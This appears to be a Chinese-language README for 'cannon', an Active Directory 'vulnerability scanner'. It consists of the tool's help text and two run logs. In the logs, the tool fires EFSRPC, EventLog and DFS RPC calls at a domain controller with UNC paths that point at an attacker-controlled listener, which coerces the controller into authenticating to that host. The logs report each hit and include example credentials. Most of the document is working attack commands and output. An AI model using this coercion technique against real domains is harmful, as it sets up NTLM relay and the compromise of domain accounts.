帮助
```text
usage: main.py [-h] [-ts] [-debug] [-dc-ip ip address] [-target-ip ip address]
               [-target dns/ip address] [-ns nameserver] [-dns-tcp]
               [-timeout seconds] [-u username@domain] [-p password]
               [-hashes [LMHASH:]NTHASH] [-k] [-sspi] [-aes hex key]
               [-no-pass]
               [-rpcs {efs1,efs2,even,dfs} [{efs1,efs2,even,dfs} ...]]
               [-listener LISTENER]

Active Directory Vulnerability Scanner

optional arguments:
  -h, --help            Show this help message and exit
  -ts                   adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -rpcs {efs1,efs2,even,dfs} [{efs1,efs2,even,dfs} ...]
                        rpcs to use
  -listener LISTENER    listener

connection options:
  -dc-ip ip address     IP Address of the domain controller. If omitted it
                        will use the domain part (FQDN) specified in the
                        target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will
                        use whatever was specified as target. This is useful
                        when target is the NetBIOS name and you cannot resolve
                        it
  -target dns/ip address
                        DNS Name or IP Address of the target machine. Required
                        for Kerberos or SSPI authentication
  -ns nameserver        Nameserver for DNS resolution
  -dns-tcp              Use TCP instead of UDP for DNS queries
  -timeout seconds      Timeout for connections

authentication options:
  -u username@domain, -username username@domain
                        Username. Format: username@domain
  -p password, -password password
                        Password
  -hashes [LMHASH:]NTHASH
                        NTLM hash, format is [LMHASH:]NTHASH
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on target parameters.
                        If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -sspi                 Use Windows Integrated Authentication (SSPI)
  -aes hex key          AES key to use for Kerberos Authentication (128 or 256
                        bits)
  -no-pass              Don't ask for password (useful for -k and -sspi)
```
默认使用efsr和管道efsrpc
```text

PS C:\> python.exe cannon/main.py -u jiayu -p SBxaVx#k$ -dc-ip 192.168.31.110 -listener 192.168.80.31 

Server loop running in thread: Thread-2
[*] 1 cannons loaded. fire!
[*] target pipe is efsrpc
[*] [lock_and_load] success
--------------------------------------------------
[*]  shooting [192.168.31.110]EfsRpcOpenFileRaw(FileName=\\192.168.80.31\rEgmz\file.txt)
[+] connection from 192.168.31.110:49796
[+] connection from 192.168.31.110:49797
[*] [+][[_shoot] target hit! please check smb server.
--------------------------------------------------
[*]  shooting [192.168.31.110]EfsRpcEncryptFileSrv(FileName=\\192.168.80.31\seWVV\file.txt)
[+] connection from 192.168.31.110:49798
[*] [+][[_shoot] target hit! please check smb server.
--------------------------------------------------
[*]  shooting [192.168.31.110]EfsRpcDecryptFileSrv(FileName=\\192.168.80.31\HzHua\file.txt)
[+] connection from 192.168.31.110:49799
[*] [+][[_shoot] target hit! please check smb server.
--------------------------------------------------
[*]  shooting [192.168.31.110]EfsRpcQueryUsersOnFile(FileName=\\192.168.80.31\RsjXX\file.txt)
[+] connection from 192.168.31.110:49800
[*] [+][[_shoot] target hit! please check smb server.
--------------------------------------------------
[*]  shooting [192.168.31.110]EfsRpcQueryRecoveryAgents(FileName=\\192.168.80.31\dfLkh\file.txt)
[+] connection from 192.168.31.110:49801
[*] [+][[_shoot] target hit! please check smb server.
--------------------------------------------------
[*]  shooting [192.168.31.110]EfsRpcRemoveUsersFromFile(FileName=\\192.168.80.31\UOYOk\file.txt)
[-] [_shoot] DFSNM SessionError: code: 0x57 - ERROR_INVALID_PARAMETER - The parameter is incorrect.
--------------------------------------------------
[*]  shooting [192.168.31.110]EfsRpcAddUsersToFile(FileName=\\192.168.80.31\hcnsU\file.txt)
[+] connection from 192.168.31.110:49802
[*] [+][[_shoot] target hit! please check smb server.
--------------------------------------------------
[*]  shooting [192.168.31.110]EfsRpcFileKeyInfo(FileName=\\192.168.80.31\qSpVo\file.txt)
[+] connection from 192.168.31.110:49803
[*] [+][[_shoot] target hit! please check smb server.
--------------------------------------------------
[*]  shooting [192.168.31.110]EfsRpcDuplicateEncryptionInfoFile(SrcFileName=\\192.168.80.31\OgtEq\file.txt, DestFileName=\\192.168.80.31\OgtEq\file.txt)
[+] connection from 192.168.31.110:49804
[*] [+][[_shoot] target hit! please check smb server.
--------------------------------------------------
[*]  shooting [192.168.31.110]EfsRpcAddUsersToFileEx(FileName=\\192.168.80.31\xHoJq\file.txt)
[+] connection from 192.168.31.110:49805
[*] [+][[_shoot] target hit! please check smb server.
[*] 

 all jobs done,costs 5s exit after 5 seconds..

```

指定rpc

```text
PS C:\> python.exe cannon/main.py -u jiayu -p SBxaVx#k2$1 -dc-ip 192.168.31.110 -listener 192.168.80.31 -rpcs even dfs 
Server loop running in thread: Thread-2

[*] 2 cannons loaded. fire!
[*] target pipe is eventlog
[*] [lock_and_load] success
--------------------------------------------------
[*]  shooting [192.168.31.110]ElfrOpenBELW(BackupFileName=\??\UNC\192.168.80.31\XTeam\h)
[+] connection from 192.168.31.110:50670
[+] connection from 192.168.31.110:50671
[*] [+][_shoot] target hit! please check smb server.
[*] target pipe is netdfs
[*] [lock_and_load] success
--------------------------------------------------
[*]  shooting [192.168.31.110]NetrDfsAddStdRoot(ServerName=\\192.168.80.31\RETHp\file.txt)
[+] connection from 192.168.31.110:50672
[+] connection from 192.168.31.110:50673
[*] [+][[_shoot] target hit! please check smb server.
--------------------------------------------------
[*]  shooting [192.168.31.110]NetrDfsRemoveStdRoot(ServerName=\\192.168.80.31\gPWLQ\file.txt)
[+] connection from 192.168.31.110:50674
[+] connection from 192.168.31.110:50675
[*] [+][[_shoot] target hit! please check smb server.
--------------------------------------------------
[*]  all jobs done,costs 1s exit after 5 seconds..

```